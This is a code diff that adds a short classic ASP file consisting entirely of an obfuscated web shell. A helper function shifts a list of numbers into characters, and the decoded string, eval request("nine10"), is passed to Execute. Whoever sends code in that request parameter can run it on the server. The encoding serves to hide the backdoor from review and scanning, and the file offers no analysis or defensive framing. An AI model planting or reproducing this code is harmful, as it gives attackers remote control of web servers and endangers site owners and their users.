@@ -1,0 +1,11 @@
+<%
+
+Function SVJU(EBSD):
+	EBSD = Split(EBSD,"<")
+	For x=0 To Ubound(EBSD)
+		SVJU=SVJU&Chr(EBSD(x)-116)
+	Next
+End Function
+EXecutE(SVJU("217<234<213<224<148<230<217<229<233<217<231<232<156<150<226<221<226<217<165<164<150<157"))
+
+%>
